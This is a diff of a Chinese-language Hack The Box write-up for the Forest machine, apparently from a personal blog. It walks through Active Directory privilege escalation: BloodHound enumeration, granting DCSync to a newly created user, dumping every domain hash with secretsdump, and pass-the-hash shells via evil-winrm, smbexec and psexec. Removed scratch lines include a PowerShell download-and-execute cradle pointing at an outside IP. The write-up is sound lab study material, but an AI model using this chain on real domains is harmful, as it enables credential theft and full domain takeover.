@@ -291,135 +291,235 @@ htb\svc-alfresco
 
 # 提权
 
+## bloodhound
+
+由于这是一台DC服务器，我们用bloodhound分析域里面的权限关系。
+
+开启neo4j
+```neo4j console```
+
+开启bloodhound
+```bloodhound --no-sandbox```
+
+把SharpHound.ps1传到靶机，执行：
 ```
-*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> .\SharpHound.exe -c all --zipfilename forest.zip
-----------------------------------------------
-Initializing SharpHound at 2:23 AM on 1/5/2022
-----------------------------------------------
-
-Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
-
-[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=htb,DC=local
-[+] Cache File Found! Loaded 209 Objects in cache
-
-[+] Pre-populating Domain Controller SIDS
-Status: 0 objects finished (+0) -- Using 23 MB RAM
-Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
-Enumeration finished in 00:00:02.4117046
-Compressing data to .\20220105022302_forest.zip
-You can upload this file directly to the UI
-
-SharpHound Enumeration Completed at 2:23 AM on 1/5/2022! Happy Graphing!
-
-*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> ls
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module C:\Users\svc-alfresco\Documents\SharpHound.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LDAPUser "svc-alfresco" -LDAPPass "s3rvice"
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls
 
 
-    Directory: C:\Users\svc-alfresco\Downloads
+    Directory: C:\Users\svc-alfresco\Documents
 
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
--a----         1/5/2022   2:23 AM          15303 20220105022302_forest.zip
--a----         1/4/2022  10:47 PM         833024 SharpHound.exe
+-a----         1/5/2022   7:04 AM          15528 20220105070402_BloodHound.zip
+-a----         1/5/2022   7:04 AM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
+-a----         1/5/2022   7:02 AM         973732 SharpHound.ps1
+
+
 
 ```
 
-下载
+把20220105053344_forest.zip从靶机下载到kali
 ```
-*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> download C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip
-Info: Downloading C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip to ./C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip                                                                            
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20220105053344_forest.zip
+Info: Downloading 20220105053344_forest.zip to ./20220105053344_forest.zip
 
                                                              
 Info: Download successful!
 
+```
+
+把20220105053344_forest.zip导入到bloodhound
+
+[这里是图片]
+
+## 分析
+
+可以看到svc-alfresco 是 Service Accounts 的成员
+svc-alfresco同时还是 Privileged IT Accounts的成员
+另外，Privileged IT Accounts 是 Account Operators 的成员
+
+Account Operators对 Exchange Windows Permissions 有 GenericAll权限
+
+何谓GenericAll权限?
+bloodhound里的help手册说明如下:
+>The members of the group ACCOUNT OPERATORS@HTB.LOCAL have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL.This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.
+
+
+可以理解可以添加域用户，为域用户赋予各种权限，我们主要的攻击点就是svc-alfresco通过一连串组继承，拥有```Exchange Windows Permissions```的权限
+
+所以这里的攻击思路是，给用户赋予DCSync的权限，然后利用secretsdump.py导出所有用户哈希。
+
+
+我们可以把```svc-alfresco```添加到```Exchange Windows Permissions```，也可以新创建一个用户（我们有创建域用户的权限），再把用户添加进```Exchange Windows Permissions```
+为了不影响其他使用这台靶机的人员，我们选择新创建用户，步骤如下：
+
+
+1. 添加一个域用户```max```，密码是：```max@123456 ```
+```net user max max@123456 /add /domain```
+
+2. 把用户```max```添加进```Exchange Windows Permissions```组里
+```net group "Exchange Windows Permissions" /add max```
+
+3. 以下操作需要先引入 PowerView.ps1，可以在evil-winrm登录的时候指定-s参数引入，也可以把PowerView.ps1下载到本地
+```
+$pass = convertto-securestring 'max@123456' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('htb\max', $pass)
+```
+4. 把```DCSync```的权限赋予域用户```max```
+```Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity max -Rights DCSync```
+
+
+操作如下
+```
+ ┌──(root💀kali)-[~/htb/Forest]
+└─# evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -s '/root/PowerSploit/Recon'
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> PowerView.ps1
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user max max@123456 /add /domain
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add max
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'max@123456' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential ('htb\max', $pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity max -Rights DCSync
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
+
+ ```
+
+现在我们已经有了DCSync的权限，可以使用secretsdump.py导出所有用户哈希，下面我只截取有有的信息
+
+```
+ ┌──(root💀kali)-[~/htb/Forest]
+└─# python3 /root/impacket-master/examples/secretsdump.py htb.local/max:max@123456@10.10.10.161
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+max:9602:aad3b435b51404eeaad3b435b51404ee:673903f73003b16a501666b84cd5b5b2:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:f88cc1cc5cd65ffa5e5913f523e71c7d:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Kerberos keys grabbed
+htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
+htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
+htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
+max:aes256-cts-hmac-sha1-96:25aa82b805321fc6545d7ee4b79927f1a24ab7aab8588d33e2cbc1ad38a3bca9
+max:aes128-cts-hmac-sha1-96:5aba96d6b256c93a03357a7d00feb097
+max:des-cbc-md5:01b51a7cdf5b02e3
+FOREST$:aes256-cts-hmac-sha1-96:f8854f2d9bcba373fadd9e70667f06dc8fbbe13bab37748aafacbf3b033e0060
+FOREST$:aes128-cts-hmac-sha1-96:28cbc2a0189779ca67c3877908e70898
+FOREST$:des-cbc-md5:4a8649d0da2a4f8c
+EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
+EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+EXCH01$:des-cbc-md5:8c45f44c16975129
+[*] Cleaning up... 
+
+```
+看到爆出了```Administrator```的哈希
+```
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+```
+ 
+现在我们可以利用pass-the-hash
+
+使用evil-winr登录
+```
+┌──(root💀kali)-[~/htb/Forest]
+└─# evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+htb\administrator
 
 ```
 
-net group 
+或者smbexec.py
+```
+┌──(root💀kali)-[~/htb/Forest]
+└─# python3 /usr/share/doc/python3-impacket/examples/smbexec.py Administrator@10.10.10.161 -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
-.\SharpHound.exe -c all --zipfilename forest.zip
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
 
-download C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip
+C:\Windows\system32>
 
-smbmap -u "svc-alfresco" -p "s3rvice" -H 10.10.10.161
+```
 
-smbclient -U 'svc-alfresco%s3rvice' //10.10.10.161/SYSVOL
+或者psexec.py
+```
+┌──(root💀kali)-[~/htb/Forest]
+└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py htb/Administrator@10.10.10.161  -hashes "32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6"
 
-mount -t cifs -o 'username=svc-alfresco,password=s3rvice' //10.10.10.161/SYSVOL /mnt/SYSVOL
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
-python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.161 htb.local/svc-alfresco  //不行
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file qJuKKMlK.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service Tifk on 10.10.10.161.....
+[*] Starting service Tifk.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
-net group"svc-alfresco" /domain
+C:\Windows\system32> whoami
+nt authority\system
+```
 
-python3 /usr/share/doc/python3-impacket/examples/secretsdump.py htb/svc-alfresco:s3rvice@10.10.10.161  //不行
-
-
-
-evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -s '/root/PowerSploit/Recon'
-
-
-
-lookupsid.py htb/svc-alfresco:s3rvice@10.10.10.161
-
-psexec.py htb/svc-alfresco:s3rvice@10.10.10.161
-
-rpcdump.py htb/svc-alfresco:s3rvice@10.10.10.161
-
-samrdump.py htb/svc-alfresco:s3rvice@10.10.10.161
-
-wmiexec.py htb/svc-alfresco:s3rvice@10.10.10.161
-
-psexec.py htb/svc-alfresco:s3rvice@10.10.10.161
-
-
-wmiexec.py forest.htb/svc-alfresco:s3rvice@10.10.10.161 
-
-python3 smbexec.py forest.htb.local\svc-alfresco:s3rvice@10.10.10.161 
-python3 psexec.py forest.htb.local\svc-alfresco:s3rvice@10.10.10.161 
-
-sebastien
-
-download C:\Users\svc-alfresco\Downloads\MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin 
-
-
-
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/   -dc-ip 10.10.10.161
-
-
-
-GetNPUsers.py htb/svc-alfresco:s3rvice@10.10.10.161 -request -dc-ip 10.10.10.30
-
-
-
-Find Shortest Paths to Domain Admins
-
-AS-REP roastable users dontreqpreauth
-
-Shortest Paths to Unconstrained Delegation Systems
-
-Shortest Paths to High Value Targets
-
-canpsremote
-hassession
-
-python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.161 htb.local/svc-alfresco
-
-secretsdump.py -dc-ip 10.10.10.161 forest.htb.local/svc-alfresco:s3rvice@10.10.10.161
-
-net view forest.htb.local
-
-crackmapexec winrm  10.10.10.161 -u 'svc-alfresco' -p "s3rvice" -d "forest.htb.local"
-
-evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --realm "forest.htb.local"
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-
-$session = New-PSSession -ComputerName FOREST.HTB.LOCAL -Credential $Cred
-
-net group "Account Operators" /domain
-
-
-
-powershell $session = New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session
+# 总结
+这台学到很多活动目录的东西，foodhold非常容易，提权我花了整整一天查各种资料才稍微明白是怎么回事
+bloodhound里点击```Find AS-REP Roastable Users (DontReqPreAuth)```会显示只有一个用户svc-alfresco，这也是为什么我们一开始可以用GetNPUsers.py拿到svc-alfresco哈希信息的原因，因为只有svc-alfresco开启了不需要kerberos预身份验证。
